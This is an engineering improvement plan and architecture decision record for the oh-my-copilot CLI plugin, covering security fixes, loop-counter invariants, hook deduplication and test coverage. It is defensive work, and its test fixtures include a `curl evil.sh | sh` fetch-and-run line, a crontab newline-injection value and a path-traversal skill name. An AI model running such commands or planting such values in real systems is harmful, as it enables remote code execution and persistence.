# Improvement Plan v3 — oh-my-copilot (@damian87/omp v0.23.0)

Final revision (consensus round 2). Incorporates all 16 round-1 instructions (verified implemented by the Critic) plus the six narrow round-2 items, all confined to the A3/A2 spec text and the risk register, and closes with the required ADR. Standalone document; supersedes v1 and v2.

Source evidence: the three audits (skills, hooks/scripts, server/runtime), all file:line-referenced, plus reviewer-verified facts: agent-stop's payload carries no turn identifier (scripts/agent-stop.mjs:56-74); hook-input.mjs:32 normalizes a `sessionId` **but falls back to `"unknown"`**, so sessionId alone cannot carry marker uniqueness; every loop-mode state carries a per-run `startedAt` (src/mode-state/ralph.ts:7,26, ultrawork.ts:7,27, ultraqa.ts:8,28) which the agent-stop hook already loads; agent-stop.mjs:15-20 has its own literal-cwd `stateFile()` with a comment documenting deliberate mirroring; installers/crontab.ts:18 pins `--root` into installed cron lines; setup.ts:139-146 is a reasoned, load-bearing claim that Copilot does not load plugin-dir hooks; setup.ts:155-201 generates `~/.copilot/hooks/omp.json` *from* hooks/hooks.json with an `export` prefix pinning the plugin root.

Verification command legend (confirmed in package.json):
- `npm test` (vitest run), `npm run lint` (eslint), `npm run build` (tsc)
- `npm run lint:skills`, `npm run check:catalog`
- Safety scan strict form (pinned): `node scripts/skills-safety-scan.mjs --root . --strict`

---

## 1. RALPLAN-DR Summary

### Principles

1. **Contracts before features.** The loop-budget invariant (one counter, one writer, hooks fire exactly once, one `.omp` root) is the foundation everything else sits on. Fix invariants first.
2. **Fail the right direction.** Security surfaces default closed (skill install, Slack allowlist). Runtime hooks fail open — and never accidentally fail closed (the preToolUse env-chain gap). Where a hook-side guard can err, it errs toward the behavior that keeps the loop alive (count anyway, never freeze the budget).
3. **Verify Copilot's behavior empirically, but block only on genuinely undecidable questions — and make invariants self-defending regardless of the measurement.** The `additionalContext` question (V2) is undecidable from the repo and blocks one item. The hook-loading question is *not* blocking: setup.ts:139-146 is a specific, reasoned, load-bearing statement by the author of the workaround, so we commit now to `~/.copilot/hooks/omp.json` as canonical and ship an idempotency guard as defense-in-depth either way; V1 merely confirms and answers one residual question (can `"hooks"` be dropped from plugin.json). Any matrix measured against a closed-source, unversioned Copilot CLI rots on its next release — which is why the guard, not the measurement, carries the invariant, and why both spike matrices must record the Copilot CLI version.
4. **Every fix lands in the same release as the test that would have caught it.** v1 violated this on the most invariant-critical file (agent-stop.mjs changed in Phase 1, its e2e net in Phase 2); the Phase-1 "loop invariants" vertical slice resolves it by carrying its own e2e harness.
5. **Enforce parity now, generate later.** The 1,614-line hand-maintained catalog is the root cause of drift; the cheap fix (parity lint) ships immediately, generation is a later refactor done on top of a test net.

### Decision Drivers (top 3)

1. **Two exploitable security findings sit in documented workflows today**: path traversal via third-party SKILL.md frontmatter on a filesystem-destructive path (src/skills.ts:45-59), and a default-open Slack bridge letting any workspace member drive a local Copilot session (slack/config.ts:19).
2. **The core product promise (bounded autonomous loops) is currently broken**: ralph iterations double-counted (~half the configured budget), state roots split between CLI and hooks — including agent-stop's own literal-cwd `stateFile()` (agent-stop.mjs:15-20) — and a possible hook double-load that would corrupt every counter and ledger.
3. **One empirical unknown gates one design decision**: whether Copilot honors `userPromptSubmitted` `additionalContext` (V2) decides where loop/ponytail context injection lives (A6). The hook-loading question is resolved by design commitment (canonical omp.json + self-defending guard); V1 only confirms it.

### Viable Options

**Option 1 — Big-bang hardening sprint.** All ~35 findings in one release. Pros: one review cycle, no files touched twice. Cons: the state-root, counter-ownership, and hook-dedup changes interact with 30 unrelated fixes in a single diff. **Invalidated on bisectability and reviewability alone**: a 35-finding PR cannot be bisected when a loop regression appears, and no reviewer can hold the interaction surface in their head.

**Option 2 — Phased with a Phase-1 vertical slice for loop invariants.** *(Chosen.)* Security fixes and the loop-invariant bundle land in the first release; the loop bundle (A1 → A3 → A2) carries its own e2e test harness and atomic-write hardening so agent-stop.mjs is churned once, tested in the same release its semantics change. Pros: exploitable security closed immediately; Principle 4 holds on the hot spot; each phase independently shippable. Cons: several releases; the Phase-1 slice is the largest single PR series in the plan (accepted: it is subsystem-scoped and reviewable as a unit).

**Option 3 — Generate-don't-maintain overhaul first.** Rewrite the catalog pipeline and consolidate the hook layer, fixing findings as side effects. Pros: kills the drift class at the root. Cons: parks exploitable security fixes behind a refactor; refactors code with *zero* current tests (safety scanner, agent-stop, daily-log.mjs) with no safety net. **Invalidated because** security can't wait behind a rewrite, and the rewrite is only safe after the test net exists. Generation survives as Phase 3 item E1.

---

## 2. The Plan

Workstreams: **V** verification spikes · **A** correctness contracts · **B** security · **C** alignment/drift · **D** test coverage · **E** maintainability.

### Phase 0 — Empirical verification spikes

**V2 — Does Copilot honor `userPromptSubmitted` `additionalContext`? [BLOCKING — gates A6, Phase 2]**
- Question: the repo's own doc says the output is ignored, yet scripts/prompt-submit.mjs:23-49 is the only injection point for `[RALPH ACTIVE]`/`[ULTRAWORK ACTIVE]`/`[ULTRAQA ACTIVE]`/`[PONYTAIL ACTIVE]`. If ignored, ponytail silently does nothing in Copilot.
- How: emit a distinctive nonce in additionalContext; prompt the model to repeat injected context verbatim; observe across 3 runs.
- Acceptance: documented yes/no in docs/plans/copilot-native-hooks.md, **with the Copilot CLI version (`copilot --version`) recorded alongside the result**. If "no," A6 relocates injection; if "yes," A6 reduces to tests.

**V1 — Do plugin hooks and installed user hooks both fire? [CONFIRMING — runs alongside Phase 1, does not block it]**
- Design decision already taken (per the reasoned, load-bearing comment at src/copilot/setup.ts:139-146, written by the author of the omp.json workaround): `~/.copilot/hooks/omp.json` is canonical, and A3's idempotency guard ships regardless of what V1 measures — the invariant must be self-defending because any measurement against an unversioned closed-source CLI rots on its next release.
- V1's sole remaining decision power: **does an only-plugin population exist** — i.e., can `"hooks"` be dropped from plugin.json without stranding users who installed the plugin but never ran `omp setup`?
- How: in a scratch project, per-event marker (append event+timestamp+pid from one handler); measure invocation counts under three configs: both sources, only-plugin, only-user-hooks.
- Acceptance: matrix (config × event → invocation count) committed to docs/plans/copilot-native-hooks.md, replacing the contradictory claims, **with the Copilot CLI version recorded in the matrix**.

### Phase 1 — P0: exploitable security + loop invariants (one release)

Three parallel lanes: **[B1 ∥ B2 ∥ B3]** ∥ **[A4]** ∥ **[loop-invariants vertical slice: A1 → A3 → A2]**.

The loop-invariants slice is one PR series touching the loop subsystem exactly once, bundling: A1 (root unification, including agent-stop's `stateFile()`), A3 (canonical hook source + atomic idempotency guard + `parseHookInput` migration), A2 (counter ownership + pinned cap semantics), the agent-stop end-to-end test harness (formerly D2's agent-stop portion), `scripts/lib/omp-root.mjs` unit tests (keystone of the root invariant), and atomic tmp+rename writes in agent-stop (formerly an E5 item). This restores Principle 4 on the hot spot: agent-stop.mjs's semantics change in the same release as the e2e net that would catch a regression.

**Lane B — security:**

**B1 — Sanitize `skillName` in installSkill (path traversal).**
- Change: src/skills.ts:45-59 — validate `skillName` against `/^[a-z0-9][a-z0-9._-]*$/` (clear error on failure), AND assert `resolve(targetDir)` starts with `resolve(targetRoot) + sep` before `rmSync`/`cpSync`. Applies to project and `--scope user` roots.
- Acceptance: fixture skill with `name: ../../../x` throws without touching the filesystem; regression tests cover traversal and valid-name cases **for both the project root and `--scope user` (`~/.copilot/skills` — the higher-blast-radius target)**, plus absolute-path names and overwrite behavior.
- Verify: `npm test && npm run build`.

**B2 — Close the default-open Slack allowlist.**
- Change: slack/config.ts:19,68 + connectors/slack.ts:116 — refuse to start when `SLACK_ALLOWED_USERS` is unset/empty, with an actionable error; explicit `SLACK_ALLOWED_USERS=*` is the documented allow-all opt-in (handler.ts:50-54 treats `*` accordingly). Mirror in `slackDoctor` and README.
- Risk: breaks empty-allowlist setups — error must name the env var and the `*` escape hatch; release-note it.
- Acceptance: empty allowlist → non-zero start with guidance; `*` → starts with logged warning; explicit list unchanged; unit tests on config parsing + handler gate.
- Verify: `npm test`.

**B3 — Serialize concurrent Slack→Copilot requests, with a bounded queue.**
- Change: connectors/slack.ts:98-111 — per-resolved-session FIFO (promise-chain map keyed by tmux session; no new deps) around `respond()`. Two overlapping DMs currently both pass the busy-gate (comms/index.ts:228-231) and interleave `send-keys` into one pane, corrupting prompts and cross-wiring replies.
- Bounds: **queue-depth cap of 3 pending items per session** — beyond the cap, the connector immediately replies in Slack with a "worker busy, try again shortly" message instead of enqueueing. **Per-item timeout: the existing `commsAsk` timeout passes through as the per-item bound**, so a stuck item times out, its caller gets the timeout reply, and the queue advances; no item can wedge the chain.
- Acceptance: concurrency test — two simulated events resolve sequentially, second starts only after the first's `commsAsk` settles, replies attributed correctly (mocked comms); a 4th concurrent event receives the busy reply without enqueueing; a timed-out item advances the queue.
- Verify: `npm test`.

**Lane A4 — hook crash-safety (independent of the loop slice):**

**A4 — Make preToolUse crash-safe when no plugin-root env var is set.**
- Driver (corrected scope): hooks/hooks.json is the *generation template* for the installed `~/.copilot/hooks/omp.json` — setup.ts:155-201 prepends an `export` pinning the plugin root, so the installed copy always resolves its script path. The bare env-chain exposure ("five unset env vars away from `node "/scripts/pre-tool-use.mjs"` denying every tool call", since preToolUse is fail-closed per the repo's own doc) applies **only to the plugin-context copy** — but the fallback added to the template propagates into every future installed copy, hardening both.
- Change: hooks/hooks.json:21 (preToolUse entry) — append a shell fallback (`|| echo '{}'`) so an unresolvable script path exits 0 with a no-op decision. Optionally apply to the other 7 entries for consistency (cosmetic there — they fail open).
- Acceptance: two command-string tests — (a) the bare template form with all five root vars unset exits 0 with valid JSON; (b) **the composed pinned form as installed (`export COPILOT_PLUGIN_ROOT=…; node … || echo '{}'`) exits 0 with valid JSON**, confirming the fallback composes with the export prefix.
- Verify: `npm test`.

**Loop-invariants vertical slice (A1 → A3 → A2, strictly ordered, one PR series):**

**A1 — Unify the `.omp` state root.**
- Change list:
  - mode-state/paths.ts:10-11 and schedule/paths.ts:14-15 switch from `join(resolve(cwd), ".omp", ...)` to `ompRoot`/`statePath` (src/omp-root.ts:9-17, src/utils/paths.ts:20-22).
  - scripts/prompt-submit.mjs:14 switches to `ompRoot(directory)`, matching session-start.mjs:39.
  - **scripts/agent-stop.mjs `stateFile()` (lines 18-20) switches to the `ompRoot` resolution, and the comment at lines 15-17 (which documents the deliberate literal-cwd mirroring) is updated to document the new invariant instead.** Without this, post-A1 the CLI writes state at the repo root while the counter-owning hook reads/writes literal cwd — breaking ralph in subdirectories, the exact scenario A1 exists to fix.
  - **src/team/state-paths.ts:33-35 (`resolveTeamPaths`) switches from literal `resolve(cwd)` to the same `ompRoot` resolution** *(Amendment v3.1-2)* — otherwise `team status/shutdown/api` from a subdirectory miss team state, the same class of failure as the schedule case below. Extend the A1 invariant test to cover team paths.
- Risk (split by durability):
  - *Loop mode state* (`.omp/state/<mode>.json`) is ephemeral — nested pre-existing state is silently orphaned; a session-start warning when a nested `.omp/state` exists between cwd and the resolved root, plus release notes, suffices. No migration.
  - *Schedule jobs are durable* (`.omp/state/schedule/jobs/*.json`) and installed crontab lines pin `--root` explicitly (installers/crontab.ts:18) — so pre-existing subdir-created jobs **keep executing on schedule** against their pinned root while becoming **invisible to `omp schedule list/remove`**, which now resolves a different root. An orphaned-but-live cron job is strictly worse than stale mode state. Mitigation: emit a prominent warning (session-start and `omp schedule list`) when a non-empty nested `.omp/state/schedule/jobs` exists between cwd and the resolved root, with the path and removal guidance; release notes.
- Acceptance: invariant test — `omp ralph start` from a subdir fixture lands state at the repo root; both prompt-submit and session-start read it; **the agent-stop handler, driven end-to-end from the same subdirectory, reads and patches that same state file**; test pins mode-state, schedule, KV, and hook scripts to one root. **`scripts/lib/omp-root.mjs` gets its own unit tests (walk-up to `.git`/`package.json`, fallback behavior) — it is the keystone of this invariant** (cross-referenced from D2).
- Verify: `npm test && npm run build`.

**A3 — Canonical hook source + self-defending idempotency guard. [after A1: markers live under the unified root]**
- Design commitment (not contingent on V1): `~/.copilot/hooks/omp.json` is the canonical hook source, per src/copilot/setup.ts:139-146. Whether `"hooks"` can be dropped from plugin.json awaits V1's only-plugin measurement; if an only-plugin population exists, `omp setup` becomes auto-triggered or hard-required before removal.
- Guard spec:
  - **Migrate agent-stop.mjs:56-57 to `parseHookInput`** (folding in the former E5 consistency item) to obtain the normalized `sessionId` (hook-input.mjs:32). Note: `sessionId` can fall back to `"unknown"` — which is why it cannot carry marker uniqueness on its own; the per-run nonce below does.
  - **Dedup key = mode + sessionId + per-run nonce + counter value.** Before persisting an increment, atomically create a marker (`fs.mkdirSync` or `fs.open` with `wx` — no existsSync-then-write TOCTOU) at **`.omp/state/locks/agentstop-<mode>-<sessionId>-<startedAt>-<counterValue>`** under the **A1-unified root**. `<startedAt>` is the per-run nonce read from the mode state the hook already loads (present on all three loop-mode states: src/mode-state/ralph.ts:7,26, ultrawork.ts:7,27, ultraqa.ts:8,28); `<mode>` namespaces markers per loop mode. `EEXIST` means another fire of the same event already advanced the counter to that value in *this run* → skip the duplicate increment. Because the key includes the run's `startedAt`, markers from a previous run can never suppress counting in a new run — the stale-marker freeze that a bare sessionId+counterValue key would cause (and which the `"unknown"` fallback would make near-certain) cannot occur.
  - **Marker lifecycle:** `omp <mode> start` and every cancel/state-clear path delete that mode's `agentstop-<mode>-*` markers, so each run begins with a clean namespace; Phase 3's E2 retention sweep of `.omp/state/locks/` remains the backstop for anything orphaned.
  - **On any other guard error, count anyway — fail open toward counting.** A rare double-count is acceptable; a silently frozen loop budget is not.
  - The guard sits **inside the existing top-level try/catch and never alters the allow/block decision** — it only gates the counter persist.
  - **Scope of the guarantee (stated precisely):** the guard ensures a *concurrent* double-fire cannot double-count. A *sequential* double-fire — where the second fire reads the already-incremented state and computes the next value — is not caught by a counter-value key and is **explicitly accepted as residual exposure**: the guard is defense-in-depth for a configuration the plan already commits to being exactly-once (canonical omp.json), not the primary mechanism.
  - Apply the same atomic-marker pattern to the other counter-mutating path, daily-log's `recordPrompt`, keyed on `sessionId` + prompt content hash **+ a coarse timestamp bucket (minute granularity)** — the bucket discriminator prevents legitimate identical prompts (e.g. a user sending "continue" twice in a session) from being falsely deduplicated and undercounting `WORK_THRESHOLD=3`, while still catching same-instant double-fires.
- Acceptance:
  - Concurrent-dedup test: same mode+sessionId+startedAt+counterValue twice → one increment; different counter values → both count.
  - Fail-open test: guard error injected → increment still happens; allow/block decision unchanged under guard failure.
  - **Restart test: start ralph with `maxIterations: 4` → advance ≥1 iteration → `omp ralph cancel` → start a fresh run → the new run's counter advances past previously-marked values (no freeze) and the cap fires at exactly 4.**
  - **Cleanup test: `omp ralph start` deletes any pre-existing `agentstop-ralph-*` markers** (asserted directly).
  - Plus the V1 matrix (confirming) shows exactly-once invocation in the shipped configuration.
- Verify: `npm test`; V1 marker harness re-run as confirmation.

**A2 — Single owner for the loop counters (ralph AND ultraqa), with pinned cap semantics. [after A3, same files] *(scope extended by Amendment v3.1-1)***
- Change: the agentStop hook becomes the sole counter writer **for every loop mode**. Ralph: remove the `omp ralph tick` instruction from .github/skills/ralph/SKILL.md step 5; repurpose `tick` to record slice completions in a separate field (so `omp ralph status` shows hook-driven turns and completed slices distinctly). **UltraQA (same disease, missed by the audits): `recordUltraqaCycle` (src/mode-state/ultraqa.ts:51-70) increments `cycleCount` — the same field loop-driver.mjs:9 has agent-stop incrementing — and .github/skills/ultraqa/SKILL.md:38 instructs `omp ultraqa cycle` every cycle. Repurpose `omp ultraqa cycle pass|fail` to record the verdict (and keep its pass→cancel behavior) WITHOUT incrementing `cycleCount`; agent-stop becomes the sole `cycleCount` writer; update the skill text accordingly.** loop-driver.mjs:39 / agent-stop.mjs:81-84 remain the only increment path; src/mode-state/ralph.ts:57 stays for the CLI but the skill no longer invokes it per-slice. (Ultrawork has no CLI counter writer — no change needed there.)
- **Cap semantics pinned in-plan: fix loop-driver.mjs:31 so `maxIterations: N` yields exactly N hook-driven continuation turns** (currently `cur + 1 >= max` yields N-1). Rationale: bundling the off-by-one fix with the counter-ownership change produces **one** release note about iteration semantics instead of two across releases.
- **Blast radius (all three modes):** loop-driver.mjs is shared, so the cap change affects **ralph, ultrawork, and ultraqa** budgets in Phase 1, and the release note must name all three. Ultrawork/ultraqa *status visibility* for the changed counters trails until A7 lands in Phase 2 (their state shapes gain `iteration`/`maxIterations` there); their runtime behavior changes now.
- Risk: user-visible semantics change — `iteration` now means hook-driven turns, budgets roughly double back to what `maxIterations` promises, and the cap is now inclusive, **across all three loop modes at once**. Status labels, skill doc, loop-driver tests (which pin the old behavior), and the three-mode release note all land in this slice.
- Acceptance (falsifiable, pinned number): start ralph with `maxIterations: 4`; simulate stop events end-to-end through the agent-stop harness; **exactly 4 continuations are granted and the 5th stop clears state and allows**; `omp ralph status` reports hook-driven turns and slice completions as separate fields; loop-driver tests assert the same N-yields-N behavior for ultrawork and ultraqa mode configs.
- Verify: `npm test`.

**Slice-bundled hardening and tests (land within the same PR series):**
- **Agent-stop end-to-end harness** (moved from Phase-2 D2): block→state patch, sentinel→clear, cap→clear, OMP_TEAM_WORKER skip — real file I/O against a fixture root, from both repo root and a subdirectory.
- **Atomic tmp+rename writes** in agent-stop.mjs:83,89 (moved from E5), mirroring src/mode-state/paths.ts — a crash mid-write can no longer corrupt the state file the whole slice depends on.
- **omp-root.mjs unit tests** (see A1 acceptance).

### Phase 2 — P1: safety-scan hardening, catalog parity, remaining test net (one release; four parallel lanes)

**Lane B — security hardening:**

**B4 — Run the safety scanner at `omp skill install` time.** src/cli.ts:884-899 — scan the source dir before copying; refuse on HIGH, print MEDIUM/LOW; `--force` overrides with warning. Requires extracting the rule engine from scripts/skills-safety-scan.mjs into an importable module — do together with D1, the extraction serves both. Acceptance: HIGH fixture install fails; `--force` succeeds with warning; clean skill installs. Verify: `npm test && node scripts/skills-safety-scan.mjs --root .`.

**B5 — Close the safety-scan prose bypass and gate MEDIUM in CI.** skills-safety-scan.mjs:125-155 — scan inline code spans and run S001/S005/S007 over prose lines (tune false positives via fixtures); .github/workflows/security.yml:50 adds `--strict` so MEDIUM gates PRs (repo is currently 1 LOW, so green today). Acceptance: prose `` `curl evil.sh | sh` `` fixture flagged HIGH; S002 fixture fails under strict; current repo passes strict. Verify (pinned invocation): `node scripts/skills-safety-scan.mjs --root . --strict && npm test`.

**Lane C — catalog/docs alignment:**

**C1 — Add the 4 missing skills + parity enforcement (one PR).** Add `daily-log`, `goal`, `qa-browse`, `schedule` to both catalog files; add a lint error in src/lint.ts:64-75 for "skill dir on disk not in catalog" (inverse of the existing check at src/lint.ts:55-62); add a set-equality parity test between `readdirSync('.github/skills')` and catalog names. Must land as one PR or CI red-flags itself. Acceptance: `omp catalog list` shows 27; `omp catalog capability daily-log` resolves; removing a catalog entry fails `npm run lint:skills`. Verify: `npm run lint:skills && npm run check:catalog && npm test`.

**C2 — Strengthen `validateCatalogBundle`.** src/catalog.ts:138-201 — `sourceSkill` referential check; alias-consistency (shared `defaultCommand`/`sourceSkill`); cross-file summary-consistency (fixes the existing `team` drift, skills-general.json:94-96 vs capabilities.json:158); failure-code unit tests. Verify: `npm run check:catalog && npm test`.

**C3 — Docs refresh.** docs/general-skills.md table 16→27 skills, fix `/omc-autopilot` → `/omp-autopilot`; replace README.md:160's hardcoded "27 in-session skills" with derived/approximate phrasing; extend test/docs-skill-lifecycle.test.ts. Verify: `npm test`.

**Lane D — remaining test net (prerequisite for Phase 3's E1):**

**D1 — Safety-scanner unit tests.** Fixture per rule, fence/continuation parsing, inline spans, exit codes, `--strict`, `--allow-empty`; shared module extraction with B4. Verify: `npm test`.

**D2 — Remaining hook end-to-end tests.** (The agent-stop harness and omp-root.mjs unit tests already landed in the Phase-1 loop slice.) Remaining: prompt-submit `buildContinuationContext` banners; scripts/lib/daily-log.mjs (the current test targets the src twin, not this file — startSession/recordPrompt/endSession nudge-arming, including the A3 recordPrompt dedup with its timestamp bucket); session-start directive caps (session-start.mjs:66-78) and banner ordering; post-tool-use-failure.mjs; stdin truncation. Verify: `npm test`.

**D3 — Gateway/runtime tests.** gateway/registry.ts (env filtering, `--only`, warning aggregation — the only untested gateway module); Slack concurrency + queue-cap tests if not landed with B3; long-prompt survival for A5. Verify: `npm test`.

**Lane A — correctness leftovers:**

**A5 — Fix `sendToWorker` silent 200-char truncation.** team/tmux.ts:209 — remove/raise the cap or use tmux load-buffer/paste-buffer; log when trimming; make the fallback at tmux.ts:222-226 verify submission instead of returning `true` unconditionally (startTeam's prompt at team/runtime.ts:117 routinely exceeds 200 chars). Acceptance: 500-char prompt arrives intact (mocked tmux records payload); fallback returns false when unverified. Verify: `npm test`.

**A6 — Relocate or confirm loop/ponytail injection. [needs V2]** If additionalContext is ignored: move ponytail to the sessionStart banner, rely on agentStop `reason` for loops, fix `omp help` copy. If honored: keep prompt-submit; D2's banner tests cover it. Acceptance: matches V2's documented finding; ponytail demonstrably affects a Copilot session. Verify: re-run the V2 nonce harness against the relocated (or confirmed) injection point on the same recorded Copilot CLI version, plus `npm test` for the relocated injection's unit tests.

**A7 — Ultrawork/ultraqa state-shape parity.** Add `iteration`/`maxIterations` to `UltraworkState` (src/mode-state/ultrawork.ts:3-11) so the TS layer reads what loop-driver.mjs:10 writes; surface in `omp ultrawork status` (and the ultraqa equivalent). This completes the status visibility for the A2 cap change that already altered these modes' runtime behavior in Phase 1. Verify: `npm test && npm run build`.

**A8 — Unify hooks.log writing.** Fix literal-cwd writes (pre-tool-use.mjs:17, post-tool-use.mjs:45, error.mjs:18) to `ompRoot`; delete the prompt-submit.mjs:51-62 duplicate in favor of `appendHookLog` (hook-output.mjs:92). Acceptance: from-subdir test shows a single log at the root. Verify: `npm test`.

**C4 — Gateway runtime health.** Hook Bolt disconnect events to flip connector `status()` (connectors/slack.ts:158 is `started=true` forever); relabel `gateway status` as configuration readiness or add a pidfile (cli.ts:1424-1444); non-zero exit from `gateway serve` when zero connectors start. Verify: `npm test`.

### Phase 3 — P2: maintainability + residual hardening

**E1 — Generate the catalogs. [after C1/C2/D-lane]** Build both catalog files from SKILL.md frontmatter plus a small per-skill metadata file (aliases, capability IDs); drop vestigial fields (`phase1` is true on every entry, making all phase1 filters at catalog.ts:108-118, list.ts:58, cli.ts:849 no-ops; triplicated path fields; duplicate description/summary) or document why they stay; CI check that committed output matches the generator. Acceptance: adding a skill dir + metadata requires no hand-edited catalog JSON. Verify: `npm run check:catalog && npm run lint:skills && npm test`.

**E2 — State retention.** Best-effort, budget-capped pruning in session-start for `.omp/state/hooks.log`, `cost/*.jsonl`, `cost/raw/*.txt` (all currently unbounded; raw stores full tool output per minified call, post-tool-use.mjs:54-63), **plus `.omp/state/locks/` (A3's dedup markers — backstop behind the per-run cleanup on mode start/clear)**. Must stay within the 5s hook budget and fail open. Verify: `npm test`.

**E3 — Windows story.** Document the bash-only limitation (hooks.json entries; POSIX `export` in src/copilot/setup.ts:155-157) in README plus an `omp doctor` warning on win32; port powershell variants only on demand. Acceptance: **`omp doctor` emits the Windows-limitation warning under a mocked/stubbed win32 platform (unit test), and the README section exists** (doc-presence assertion). Verify: `npm test`.

**E4 — Dead code and duplication.** Delete `monitorTeam`/idle-nudge (team/runtime.ts:222-279, ~120 lines, zero callers — note it removes team's only, currently unreachable, mode-state consumer); retire duplicated `slack doctor` (cli.ts:1355-1378) by delegating to `slackDoctor` with a legacy-shape adapter, fixing the malformed-token false-`ok`; unify on project.ts `parseFrontmatter` (delete src/lint.ts:15-25). Verify: `npm test && npm run lint && npm run build`.

**E5 — Residual hardening batch (small, independent):**
- CRON_RE newline rejection + field validation (schedule/commands.ts:22, crontab injection surface at installers/crontab.ts:18); test: `--cron "* * * * *\n@reboot x"` rejected.
- Compare-and-delete stale-lock steal (schedule/lock.ts:83-91); test: two simulated stealers → one winner.
- Try/catch on stateRead's `unlinkSync` (state.ts:44).
- Guard schedule `persist()` re-add race (runner.ts:64-76 vs commands.ts:103-109) — re-read + merge or job-file mtime check.
- Prompts off argv in schedule/runner.ts:130 and council/index.ts:50 (`ps` visibility on shared hosts).
- **Council `runWithConcurrency` contract fix (dispositioned in-plan):** wrap each worker invocation in a per-item try/catch so a throwing worker yields a per-item error result instead of rejecting the whole `Promise.all` and losing all results (council/engine.ts:36-51 — currently safe only because `runMember` never throws); unit test with a throwing member.
- Scope the `$VAR` lint regex (src/lint.ts:84) as test/lint.test.ts:17 does + lint negative-path fixtures (skill.missing, name mismatch, portability).
- Document (or remove) the `RALPH_COMPLETE`/`ULTRAQA_COMPLETE`/`ULTRAWORK_COMPLETE` sentinels in the three skills — decide alongside A2's counter model (same release note family if removal).
- Friendly JSON-parse error in `omp catalog list` (cli.ts:847), matching `omp list`'s tolerance (list.ts:65-67).
- *(Moved to Phase 1 loop slice: atomic tmp+rename in agent-stop; `parseHookInput` migration in agent-stop.)*
- Verify each: `npm test` (+ `npm run lint:skills` for lint items).

### Sequencing & dependencies

```
Phase 0:  V2 (blocking spike — gates A6 in Phase 2)
          V1 (confirming — runs alongside Phase 1; decides only whether
              "hooks" can be dropped from plugin.json)
Phase 1:  [B1 ∥ B2 ∥ B3]  ∥  [A4]  ∥  [loop slice: A1 → A3 → A2
              + agent-stop e2e harness + atomic writes + omp-root tests]
Phase 2:  [B4+B5+D1]  ∥  [C1→C2, C3]  ∥  [D2 remainder, D3]
              ∥  [A5, A6(needs V2), A7, A8, C4]
Phase 3:  E1 (needs C1+C2+D green)  ∥  E2 ∥ E3 ∥ E4 ∥ E5
```

Fully independent: B1, B2, B3, A4, A5, A7, C3, C4, E2, E3, and every E5 item. Coupled: **A1 → A3 → A2 (strict order: A3's markers live under A1's unified root; A2 rides on A3's guard and harness)**, B4↔D1 (shared rule extraction), C1→C2, E1 last. V1 must complete before the plugin.json `"hooks"` removal decision (which can trail the Phase-1 release without harm — the guard protects either way).

### Risk register

| Change | Risk | Mitigation |
|---|---|---|
| A1 root (loop state) | Nested `.omp` mode state from subdirs orphaned; pre-upgrade subdir loops lose state | Ephemeral — session-start warning on nested `.omp/state`; release notes; no migration |
| A1 root (schedule) | **Durable** jobs: crontab pins `--root` (installers/crontab.ts:18), so pre-existing subdir jobs keep executing while invisible to `omp schedule list/remove` — orphaned-but-live cron entries | Prominent warning (session-start and `omp schedule list`) when a non-empty nested `.omp/state/schedule/jobs` exists, with path + removal guidance; release notes |
| A2 counter + cap | Iteration semantics change; budgets effectively double; cap becomes inclusive (N yields N) — **and via shared loop-driver.mjs this hits ralph, ultrawork, and ultraqa simultaneously, with ultrawork/ultraqa status visibility trailing until A7 in Phase 2** | Ownership change and off-by-one fix bundled → one release note **naming all three modes**; status labels, skill doc, loop-driver tests updated in the slice; A7 closes the visibility gap next release |
| A3 stale markers (non-error path) | A marker key without a per-run nonce would let a *previous run's* markers suppress counting in a new run once the fresh counter reaches a previously-marked value — freezing `iteration`, so `cur+1>=max` never trips and the safety cap inverts into an unbounded loop; the `"unknown"` sessionId fallback (hook-input.mjs:32) would make cross-session collisions near-certain | Per-run `startedAt` nonce + mode namespace in the key; `omp <mode> start`/cancel/state-clear purge the mode's marker namespace; the restart acceptance test pins the no-freeze behavior; E2 sweep as backstop |
| A3 guard error path | Guard I/O failure could freeze the budget if it failed toward skipping | Spec'd fail-open **toward counting**: rare double-count accepted; guard never alters allow/block; sits inside existing try/catch |
| A3 hook source | Dropping plugin.json `"hooks"` strands never-ran-setup users | V1's only-plugin measurement decides; auto/require setup before removal if that population exists |
| B2 allowlist | Breaks empty-allowlist setups | `SLACK_ALLOWED_USERS=*` opt-in; actionable error |
| B3 queue | Unbounded queue growth under a chatty channel accumulates silent latency | Depth cap of 3 with user-visible "worker busy" Slack reply; commsAsk timeout as per-item bound so no item wedges the chain |
| B5 `--strict` | Future MEDIUMs block PRs | Intended; repo currently green (1 LOW) |
| C1 parity lint | CI red if lint and catalog land separately | Single PR |
| E1 generation | Regenerated JSON churn | CI generator-match check; land after C2 pins semantics |

---

## 3. Out of Scope (deliberate)

- **Wiring up `monitorTeam`/idle-nudge as a feature** — dead code with zero callers; deleting (E4) is the maintenance move, resurrection is a product decision.
- **Full Windows port of the hook layer** — no evidence of demand; E3 documents + doctor-warns (with a tested acceptance criterion); a powershell port is a separate effort if demand materializes.
- **sessionStart version-check network fetch (dispositioned: declined as a change).** The registry fetch (scripts/lib/version-check.mjs:40) has a 2s abort and 6h cache, keeping cold-start within the 5s hook budget; accepted as-is. E2's pruning must respect the same budget and adds no further network I/O.
- **tools/release.sh tests** — maintainer-only, low blast radius.
- **Rearchitecting the tmux comms layer** — B3's bounded serialization removes the concurrency corruption; deeper redesign is speculative without real multi-user load.
- **`omp suggest` catalog-backed validation** — all suggested commands exist today; C1/C2 shrink the drift class; fold into E1 if trivial.
- **Dependency upgrades** — nothing flagged; `audit:ci` already gates HIGH.
- **New features** — this plan restores invariants, closes security gaps, and pays down drift; features resume on the hardened base.

---

## 4. ADR — Phased Hardening with a Loop-Invariants Vertical Slice

**Status:** Accepted (ralplan consensus, 3 rounds: v1 ITERATE → v2 ITERATE → v3 — Architect SOUND, Critic APPROVE, 2026-07-05). Amended v3.1 same day after an independent external Codex review (verdict DISSENT, four material findings verified against the repo and reconciled in section 6).

**Decision.** Remediate the ~35 audit findings in four phases: (0) two empirical spikes against the Copilot CLI, only one of which (additionalContext honoring) blocks anything; (1) a P0 release combining the three exploitable-security fixes (installSkill traversal, Slack allowlist default-open, Slack request serialization) with a single "loop invariants" vertical slice (state-root unification → canonical hook source with a self-defending, per-run-nonced idempotency guard → single-owner iteration counter with N-yields-N cap semantics), bundled with the agent-stop e2e harness, atomic writes, and omp-root tests; (2) a P1 release for safety-scanner hardening, catalog parity enforcement, and the remaining test net; (3) a P2 release for catalog generation, retention, Windows documentation, dead-code removal, and residual hardening. `~/.copilot/hooks/omp.json` is committed as the canonical hook source now, on repo evidence (setup.ts:139-146), rather than after measurement.

